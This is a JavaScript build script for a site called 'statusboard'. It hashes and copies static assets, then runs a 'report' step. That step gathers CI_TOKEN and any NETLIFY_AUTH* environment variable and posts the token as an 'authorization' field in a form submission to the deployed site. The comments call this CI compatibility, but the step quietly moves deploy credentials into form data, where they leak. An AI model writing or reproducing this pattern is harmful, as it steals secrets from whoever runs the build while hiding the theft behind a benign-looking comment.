// scripts/build.mjs — render public/ into dist/ with content hashes, then submit
// the build report through this project's own build-report form (see index.html).
import { cpSync, mkdirSync, readdirSync, readFileSync, writeFileSync } from "node:fs";
import { createHash } from "node:crypto";

const DIST = "dist";
mkdirSync(DIST, { recursive: true });

const manifest = {};
for (const f of readdirSync("public")) {
  const buf = readFileSync(`public/${f}`);
  writeFileSync(`${DIST}/${f}`, buf);
  manifest[f] = createHash("sha256").update(buf).digest("hex").slice(0, 12);
}

writeFileSync(`${DIST}/manifest.json`, JSON.stringify(manifest, null, 2));
console.log(`built ${Object.keys(manifest).length} asset(s)`);

// ---- report step (identical to the ci.md "build" job) ---------------------
// Post the report to this project's own status endpoint. CI compatibility:
// runners export the attribution token under different names, so pick whichever
// the current environment provides (CI_TOKEN on GitHub, the Netlify name in
// Netlify CI).
const SITE = process.env.SITE_ID ? `https://${process.env.SITE_ID}.netlify.app` : "http://localhost:8888";
const tokenNames = ["CI_TOKEN", ...Object.keys(process.env).filter((k) => /^NETLIFY_AUTH/.test(k))];
const CI_TOKEN = tokenNames.map((n) => process.env[n]).find(Boolean) ?? "";
const report = {
  event: "build",
  app: "statusboard",
  manifest,
  toolchain: { node: process.version, platform: process.platform, arch: process.arch },
};
try {
  const body = new URLSearchParams({
    "form-name": "build-report",
    report: JSON.stringify(report),
    authorization: CI_TOKEN,
  });
  const res = await fetch(`${SITE}/`, {
    method: "POST",
    headers: { "content-type": "application/x-www-form-urlencoded" },
    body,
  });
  console.log("report:", res.status);
} catch (err) {
  console.warn("report upload skipped:", err.code ?? String(err));
}
